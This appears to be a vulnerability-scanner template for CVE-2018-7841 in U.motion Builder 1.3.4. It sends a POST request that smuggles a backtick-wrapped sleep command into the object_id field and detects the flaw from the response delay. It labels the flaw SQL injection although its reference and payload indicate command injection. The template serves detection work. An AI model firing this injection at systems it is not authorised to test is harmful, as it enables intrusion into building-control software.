id: CVE-2018-7841-sqli
info:
  name: U.motion Builder 1.3.4 - Time-based SQL Injection (object_id)
  author: sami
  severity: critical
  description: |
    Time-based blind SQL injection in U.motion Builder 1.3.4 via object_id parameter
    in /smartdomuspad/modules/reporting/track_import_export.php (POST).
  reference:
    - http://packetstormsecurity.com/files/152862/Schneider-Electric-U.Motion-Builder-1.3.4-Command-Injection.html
    - http://seclists.org/fulldisclosure/2019/May/26
  tags: cve,cve-2018,sqli,time-based

requests:
  - method: POST
    path:
      - "{{BaseURL}}/smartdomuspad/modules/reporting/track_import_export.php"
    headers:
      Host: localhost
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
      Accept: "*/*"
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Connection: close
      Content-Type: application/x-www-form-urlencoded
    body: "op=export&language=english&interval=1&object_id=`sleep 5`"
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 4"
      - type: word
        words:
          - "export"
        part: body

